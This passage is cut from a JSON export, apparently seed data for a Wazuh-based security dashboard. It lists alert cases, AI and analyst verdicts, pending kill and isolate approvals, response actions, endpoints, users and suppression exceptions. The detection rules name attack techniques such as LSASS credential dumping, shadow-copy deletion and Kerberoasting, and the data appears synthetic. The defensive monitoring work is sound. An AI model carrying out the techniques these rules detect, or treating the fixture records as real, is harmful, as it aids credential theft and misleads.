file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-24T15:57:23.252793+00:00","last_seen":"2026-10-24T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":34,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-24T14:57:23.252793+00:00","last_seen":"2026-10-24T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":8,"rule_id":100235,"rule_level":12,"rule_desc":"5+ account lockouts within 5 minutes (possible password spray)","technique":"T1110.003","agent_name":"DC01","source_ip":"10.0.10.88","alert_count":6,"verdict":"NEEDS_REVIEW","confidence":0.5,"verdict_by":"ai","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-24T13:57:23.252793+00:00","last_seen":"2026-10-24T14:03:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"notify","storm":false,"first_seen_env":false},{"id":35,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-HR-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-24T13:57:23.252793+00:00","last_seen":"2026-10-24T13:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":36,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-SALES-03","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-24T12:57:23.252793+00:00","last_seen":"2026-10-24T12:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":9,"rule_id":100211,"rule_level":12,"rule_desc":"Microsoft Defender exclusion added or changed","technique":"T1562.001","agent_name":"SRV-FILE-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":1.0,"verdict_by":"knowledge","risk":"low","analyst_verdict":null,"status":"closed","first_seen":"2026-10-23T17:57:23.252793+00:00","last_seen":"2026-10-23T17:58:23.252793+00:00","incident_id":null,"close_reason":"Closed by admin","host_mode":"notify","storm":false,"first_seen_env":false},{"id":32,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-23T15:57:23.252793+00:00","last_seen":"2026-10-23T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":29,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-22T15:57:23.252793+00:00","last_seen":"2026-10-22T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":30,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-22T14:57:23.252793+00:00","last_seen":"2026-10-22T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":31,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-HR-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-22T13:57:23.252793+00:00","last_seen":"2026-10-22T13:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":10,"rule_id":100240,"rule_level":9,"rule_desc":"Autostart registry value set by C:\\Users\\d.kumar\\AppData\\Roaming\\updater.exe","technique":"T1547.001","agent_name":"WS-HR-01","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":0.4,"verdict_by":"ai","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-22T11:57:23.252793+00:00","last_seen":"2026-10-22T11:58:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"contain","storm":false,"first_seen_env":true},{"id":27,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-20T15:57:23.252793+00:00","last_seen":"2026-10-20T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":28,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-20T14:57:23.252793+00:00","last_seen":"2026-10-20T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":11,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"KIOSK-01","source_ip":null,"alert_count":1,"verdict":"NEEDS_REVIEW","confidence":0.5,"verdict_by":"ai","risk":"medium","analyst_verdict":null,"status":"open","first_seen":"2026-10-20T09:57:23.252793+00:00","last_seen":"2026-10-20T09:58:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":"monitor","storm":false,"first_seen_env":false},{"id":23,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-19T15:57:23.252793+00:00","last_seen":"2026-10-19T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":24,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-19T14:57:23.252793+00:00","last_seen":"2026-10-19T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":25,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-HR-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-19T13:57:23.252793+00:00","last_seen":"2026-10-19T13:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":26,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-SALES-03","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-19T12:57:23.252793+00:00","last_seen":"2026-10-19T12:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":22,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-18T15:57:23.252793+00:00","last_seen":"2026-10-18T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":19,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-17T15:57:23.252793+00:00","last_seen":"2026-10-17T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":20,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-17T14:57:23.252793+00:00","last_seen":"2026-10-17T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":21,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-HR-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-17T13:57:23.252793+00:00","last_seen":"2026-10-17T13:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":17,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-15T15:57:23.252793+00:00","last_seen":"2026-10-15T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":18,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-15T14:57:23.252793+00:00","last_seen":"2026-10-15T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":13,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-14T15:57:23.252793+00:00","last_seen":"2026-10-14T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":14,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-02","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-14T14:57:23.252793+00:00","last_seen":"2026-10-14T14:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":15,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-HR-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-14T13:57:23.252793+00:00","last_seen":"2026-10-14T13:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":16,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-SALES-03","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-14T12:57:23.252793+00:00","last_seen":"2026-10-14T12:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false},{"id":12,"rule_id":100146,"rule_level":10,"rule_desc":"LOLBin used to download or decode a file","technique":"T1105","agent_name":"WS-FIN-01","source_ip":null,"alert_count":1,"verdict":"FP","confidence":null,"verdict_by":"knowledge","risk":"low","analyst_verdict":"FP","status":"closed","first_seen":"2026-10-13T15:57:23.252793+00:00","last_seen":"2026-10-13T15:57:23.252793+00:00","incident_id":null,"close_reason":null,"host_mode":null,"storm":false,"first_seen_env":false}],"/api/approvals":[{"id":3,"case_id":4,"agent_id":"003","agent_name":"WS-HR-01","action":"kill","params":{"pid":"7740","name":"powershell.exe","rule":"Office document or PDF reader started a shell or script host (malicious document)"},"reason":"Kill proposed by the policy","risk":"high","status":"rejected","suspended":false,"requested_at":"2026-10-26T15:57:23.574730+00:00","expires_at":"2026-10-26T16:27:23.574730+00:00","decided_by":"admin","decided_via":"dashboard","decided_at":"2026-10-26T15:57:24.895972+00:00","note":"No action taken.","rule_desc":"Office document or PDF reader started a shell or script host (malicious document)","rule_level":12,"verdict":"TP"},{"id":2,"case_id":2,"agent_id":"004","agent_name":"WS-SALES-03","action":"isolate","params":{"hours":4},"reason":"Isolation proposed for a high-risk case","risk":"high","status":"pending","suspended":false,"requested_at":"2026-10-26T15:57:23.446269+00:00","expires_at":"2026-10-26T16:19:24.915409+00:00","decided_by":null,"decided_via":null,"decided_at":null,"note":null,"rule_desc":"Shadow copies deleted or shrunk (ransomware precursor)","rule_level":14,"verdict":"TP"},{"id":1,"case_id":1,"agent_id":"001","agent_name":"WS-FIN-01","action":"kill","params":{"pid":"6120","name":"procdump64.exe","rule":"Suspicious handle opened to LSASS"},"reason":"Kill proposed by the policy","risk":"high","status":"pending","suspended":false,"requested_at":"2026-10-26T15:57:23.352645+00:00","expires_at":"2026-10-26T16:19:24.915409+00:00","decided_by":null,"decided_via":null,"decided_at":null,"note":null,"rule_desc":"Suspicious handle opened to LSASS","rule_level":13,"verdict":"TP"}],"/api/actions":[{"id":22,"case_id":42,"agent_id":"004","agent_name":"WS-SALES-03","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:24.229741+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Script host ran a script from Downloads or a temporary folder"},"rule_desc":"Script host ran a script from Downloads or a temporary folder","risk":"medium"},{"id":21,"case_id":41,"agent_id":"003","agent_name":"WS-HR-01","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:24.157013+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Script host ran a script from Downloads or a temporary folder"},"rule_desc":"Script host ran a script from Downloads or a temporary folder","risk":"medium"},{"id":20,"case_id":40,"agent_id":"002","agent_name":"WS-FIN-02","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:24.092023+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Script host ran a script from Downloads or a temporary folder"},"rule_desc":"Script host ran a script from Downloads or a temporary folder","risk":"medium"},{"id":19,"case_id":39,"agent_id":"001","agent_name":"WS-FIN-01","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:24.033053+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Script host ran a script from Downloads or a temporary folder"},"rule_desc":"Script host ran a script from Downloads or a temporary folder","risk":"medium"},{"id":18,"case_id":10,"agent_id":"003","agent_name":"WS-HR-01","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.900976+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Autostart registry value set by C:\\Users\\d.kumar\\AppData\\Roaming\\updater.exe"},"rule_desc":"Autostart registry value set by C:\\Users\\d.kumar\\AppData\\Roaming\\updater.exe","risk":"medium"},{"id":17,"case_id":8,"agent_id":"006","agent_name":"DC01","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.794824+00:00","finished_at":null,"expires_at":null,"params":{"rule":"5+ account lockouts within 5 minutes (possible password spray)"},"rule_desc":"5+ account lockouts within 5 minutes (possible password spray)","risk":"medium"},{"id":16,"case_id":7,"agent_id":"002","agent_name":"WS-FIN-02","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.740357+00:00","finished_at":null,"expires_at":null,"params":{"rule":"LOLBin used to download or decode a file"},"rule_desc":"LOLBin used to download or decode a file","risk":"medium"},{"id":15,"case_id":6,"agent_id":"006","agent_name":"DC01","action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.689260+00:00","finished_at":null,"expires_at":null,"params":{"pid":null},"rule_desc":"HONEYTOKEN: service ticket requested for decoy SPN account (Kerberoasting)","risk":"high"},{"id":14,"case_id":6,"agent_id":"006","agent_name":"DC01","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.686265+00:00","finished_at":null,"expires_at":null,"params":{"rule":"HONEYTOKEN: service ticket requested for decoy SPN account (Kerberoasting)"},"rule_desc":"HONEYTOKEN: service ticket requested for decoy SPN account (Kerberoasting)","risk":"high"},{"id":13,"case_id":5,"agent_id":"005","agent_name":"SRV-FILE-01","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.633931+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Brute force: 10+ failed logons from 203.0.113.45 within 2 minutes"},"rule_desc":"Brute force: 10+ failed logons from 203.0.113.45 within 2 minutes","risk":"medium"},{"id":12,"case_id":4,"agent_id":"003","agent_name":"WS-HR-01","action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.573705+00:00","finished_at":null,"expires_at":null,"params":{"pid":"7740"},"rule_desc":"Office document or PDF reader started a shell or script host (malicious document)","risk":"high"},{"id":11,"case_id":4,"agent_id":"003","agent_name":"WS-HR-01","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.570989+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Office document or PDF reader started a shell or script host (malicious document)"},"rule_desc":"Office document or PDF reader started a shell or script host (malicious document)","risk":"high"},{"id":10,"case_id":3,"agent_id":"002","agent_name":"WS-FIN-02","action":"scan","target":"Defender quick scan","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.512468+00:00","finished_at":null,"expires_at":null,"params":{},"rule_desc":"Microsoft Defender detected malware","risk":"high"},{"id":9,"case_id":3,"agent_id":"002","agent_name":"WS-FIN-02","action":"kill","target":"setup_crack.exe (PID 3312)","status":"done","detail":"Stopped setup_crack.exe (PID 3312)","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.508000+00:00","finished_at":"2026-10-26T15:57:24.511629+00:00","expires_at":null,"params":{"pid":"3312","name":"setup_crack.exe","rule":"Microsoft Defender detected malware"},"rule_desc":"Microsoft Defender detected malware","risk":"high"},{"id":8,"case_id":3,"agent_id":"002","agent_name":"WS-FIN-02","action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.500658+00:00","finished_at":null,"expires_at":null,"params":{"pid":"3312"},"rule_desc":"Microsoft Defender detected malware","risk":"high"},{"id":7,"case_id":3,"agent_id":"002","agent_name":"WS-FIN-02","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.497738+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Microsoft Defender detected malware"},"rule_desc":"Microsoft Defender detected malware","risk":"high"},{"id":6,"case_id":2,"agent_id":"004","agent_name":"WS-SALES-03","action":"scan","target":"Defender quick scan","status":"done","detail":"Quick scan started with Microsoft Defender","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.445698+00:00","finished_at":"2026-10-26T15:57:24.409978+00:00","expires_at":null,"params":{},"rule_desc":"Shadow copies deleted or shrunk (ransomware precursor)","risk":"high"},{"id":5,"case_id":2,"agent_id":"004","agent_name":"WS-SALES-03","action":"kill","target":"invoice_viewer.exe (PID 4880)","status":"done","detail":"Stopped invoice_viewer.exe (PID 4880) and 1 child process(es)","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.444016+00:00","finished_at":"2026-10-26T15:57:24.355909+00:00","expires_at":null,"params":{"pid":"4880","name":"invoice_viewer.exe","rule":"Shadow copies deleted or shrunk (ransomware precursor)"},"rule_desc":"Shadow copies deleted or shrunk (ransomware precursor)","risk":"high"},{"id":4,"case_id":2,"agent_id":"004","agent_name":"WS-SALES-03","action":"evidence","target":"light evidence","status":"done","detail":"212 processes, 64 connections (3 external), 98 automatic services, 4 non-Microsoft tasks, 6 Run entries","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.441288+00:00","finished_at":"2026-10-26T15:57:24.457535+00:00","expires_at":null,"params":{"pid":"4880"},"rule_desc":"Shadow copies deleted or shrunk (ransomware precursor)","risk":"high"},{"id":3,"case_id":2,"agent_id":"004","agent_name":"WS-SALES-03","action":"notice","target":"popup","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.438961+00:00","finished_at":null,"expires_at":null,"params":{"rule":"Shadow copies deleted or shrunk (ransomware precursor)"},"rule_desc":"Shadow copies deleted or shrunk (ransomware precursor)","risk":"high"},{"id":2,"case_id":1,"agent_id":"001","agent_name":"WS-FIN-01","action":"evidence","target":"light evidence","status":"sent","detail":"sent to the agent","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.351159+00:00","finished_at":null,"expires_at":null,"params":{"pid":"6120"},"rule_desc":"Suspicious handle opened to LSASS","risk":"high"},{"id":1,"case_id":1,"agent_id":"001","agent_name":"WS-FIN-01","action":"notice","target":"popup","status":"done","detail":"Popup shown to the signed-in users","origin":"auto","requested_by":null,"approval_id":null,"created_at":"2026-10-26T15:57:23.348691+00:00","finished_at":"2026-10-26T15:57:24.566896+00:00","expires_at":null,"params":{"rule":"Suspicious handle opened to LSASS"},"rule_desc":"Suspicious handle opened to LSASS","risk":"high"}],"/api/incidents":[{"id":1,"signature":"sig-outbreak","rule_id":100221,"rule_desc":"Script host ran a script from Downloads or a temporary folder","status":"open","host_count":5,"hosts":["KIOSK-01","WS-FIN-01","WS-FIN-02","WS-HR-01","WS-SALES-03"],"first_seen":"2026-10-26T15:57:24.029251+00:00","last_seen":"2026-10-26T15:57:24.300898+00:00","closed_at":null}],"/api/agents":{"agents":[{"id":"001","name":"WS-FIN-01","ip":"10.10.0.1","status":"active","groups":["client"],"last_keepalive":"2026-10-25T09:00:00Z","os":"Windows 11","platform":"windows","version":"Wazuh v4.14.0","sources":[{"location":"Microsoft-Windows-Sysmon/Operational","events":300,"drops":2},{"location":"Security","events":120,"drops":0}],"sources_error":null,"isolated":false,"alerts_24h":2,"open_cases":2,"last_alert":"2026-10-26T15:34:23.252793+00:00"},{"id":"002","name":"WS-FIN-02","ip":"10.10.0.2","status":"active","groups":["client"],"last_keepalive":"2026-10-25T09:00:00Z","os":"Windows 11","platform":"windows","version":"Wazuh v4.14.0","sources":[{"location":"Microsoft-Windows-Sysmon/Operational","events":300,"drops":2},{"location":"Security","events":120,"drops":0}],"sources_error":null,"isolated":false,"alerts_24h":2,"open_cases":3,"last_alert":"2026-10-26T15:36:23.252793+00:00"},{"id":"003","name":"WS-HR-01","ip":"10.10.0.3","status":"active","groups":["client"],"last_keepalive":"2026-10-25T09:00:00Z","os":"Windows 11","platform":"windows","version":"Wazuh v4.14.0","sources":[{"location":"Microsoft-Windows-Sysmon/Operational","events":300,"drops":2},{"location":"Security","events":120,"drops":0}],"sources_error":null,"isolated":false,"alerts_24h":3,"open_cases":3,"last_alert":"2026-10-26T15:40:23.252793+00:00"},{"id":"004","name":"WS-SALES-03","ip":"10.10.0.4","status":"active","groups":["client"],"last_keepalive":"2026-10-25T09:00:00Z","os":"Windows 11","platform":"windows","version":"Wazuh v4.14.0","sources":[{"location":"Microsoft-Windows-Sysmon/Operational","events":300,"drops":2},{"location":"Security","events":120,"drops":0}],"sources_error":null,"isolated":false,"alerts_24h":4,"open_cases":2,"last_alert":"2026-10-26T15:44:23.252793+00:00"},{"id":"005","name":"SRV-FILE-01","ip":"10.10.0.5","status":"active","groups":["server"],"last_keepalive":"2026-10-25T09:00:00Z","os":"Windows 11","platform":"windows","version":"Wazuh v4.14.0","sources":[{"location":"Microsoft-Windows-Sysmon/Operational","events":300,"drops":2},{"location":"Security","events":120,"drops":0}],"sources_error":null,"isolated":false,"alerts_24h":14,"open_cases":1,"last_alert":"2026-10-25T20:11:23.252793+00:00"},{"id":"006","name":"DC01","ip":"10.10.0.6","status":"active","groups":["dc"],"last_keepalive":"2026-10-25T09:00:00Z","os":"Windows 11","platform":"windows","version":"Wazuh v4.14.0","sources":[{"location":"Microsoft-Windows-Sysmon/Operational","events":300,"drops":2},{"location":"Security","events":120,"drops":0}],"sources_error":null,"isolated":false,"alerts_24h":0,"open_cases":2,"last_alert":"2026-10-25T13:58:23.252793+00:00"},{"id":"007","name":"KIOSK-01","ip":"10.10.0.7","status":"active","groups":["kiosk"],"last_keepalive":"2026-10-25T09:00:00Z","os":"Windows 11","platform":"windows","version":"Wazuh v4.14.0","sources":[{"location":"Microsoft-Windows-Sysmon/Operational","events":300,"drops":2},{"location":"Security","events":120,"drops":0}],"sources_error":null,"isolated":false,"alerts_24h":1,"open_cases":2,"last_alert":"2026-10-26T15:48:23.252793+00:00"}],"wazuh_error":null},"/api/knowledge":[{"signature":"sig8","verdict":"FP","confidence":1.0,"source":"analyst","reasoning":"Backup agent adds its exclusion after updates","rule_desc":"Microsoft Defender exclusion added or changed","example_case_id":null,"hits":7,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-29T15:57:23.295869+00:00","disabled":false,"updated_by":"sec.anna"},{"signature":"sig-hist","verdict":"FP","confidence":1.0,"source":"analyst","reasoning":"IT inventory script uses certutil to decode its config","rule_desc":"LOLBin used to download or decode a file","example_case_id":null,"hits":23,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-12-06T15:57:23.295869+00:00","disabled":false,"updated_by":"sec.anna"},{"signature":"sig3","verdict":"TP","confidence":0.86,"source":"ai","reasoning":"Malicious macro starting hidden PowerShell","rule_desc":"Office document or PDF reader started a shell or script host (malicious document)","example_case_id":null,"hits":0,"updated_at":"2026-10-26T15:57:23.295869+00:00","expires_at":"2026-11-24T15:57:23.295869+00:00","disabled":false,"updated_by":null}],"/api/exceptions":[{"id":2,"rule_id":100146,"scope":"group","scope_value":"client","match_type":"process_path","match_value":"C:\\Program Files\\IT-Inventory\\*","effect":"no_action","enabled":true,"expires_at":null,"note":"Inventory tool decodes its configuration","hits":0,"created_by":"admin","created_at":"2026-10-26T15:57:25.726036+00:00"},{"id":1,"rule_id":100211,"scope":"host","scope_value":"SRV-FILE-01","match_type":"command_contains","match_value":"BackupAgent","effect":"suppress","enabled":true,"expires_at":"2027-04-24T15:57:25.667200+00:00","note":"Backup agent updates its own exclusion","hits":0,"created_by":"admin","created_at":"2026-10-26T15:57:25.667200+00:00"}],"/api/users":{"users":[{"id":1,"username":"admin","role":"admin","must_change":false,"disabled":false,"totp_enabled":true,"telegram_id":null,"locked_until":null,"created_at":"2026-10-26T15:57:22.728214+00:00","last_login_at":"2026-10-26T13:57:25.805846+00:00"},{"id":3,"username":"it.helpdesk","role":"viewer","must_change":true,"disabled":false,"totp_enabled":false,"telegram_id":null,"locked_until":null,"created_at":"2026-10-26T15:57:25.348161+00:00","last_login_at":"2026-10-26T13:57:25.805846+00:00"},{"id":2,"username":"sec.anna","role":"analyst","must_change":true,"disabled":false,"totp_enabled":true,"telegram_id":5550001,"locked_until":null,"created_at":"2026-10-26T15:57:25.135583+00:00","last_login_at":"2026-10-26T13:57:25.805846+00:00"},{"id":4,"username":"sec.omar","role":"analyst","must_change":true,"disabled":false,"totp_enabled":false,"telegram_id":null,"locked_until":null,"created_at":"2026-10-26T15:57:25.561190+00:00","last_login_at":"2026-10-26T13:57:25.805846+00:00"}],"reset_requests":[{"id":1,"username":"it.helpdesk","requested_at":"2026-10-26T15:57:25.607073+00:00","requester_ip":"127.0.0.1"}]},"/api/audit":[{"id":10,"ts":"2026-10-26T15:57:25.789866+00:00","username":"admin","role":"admin","action":"case.closed","target":"case 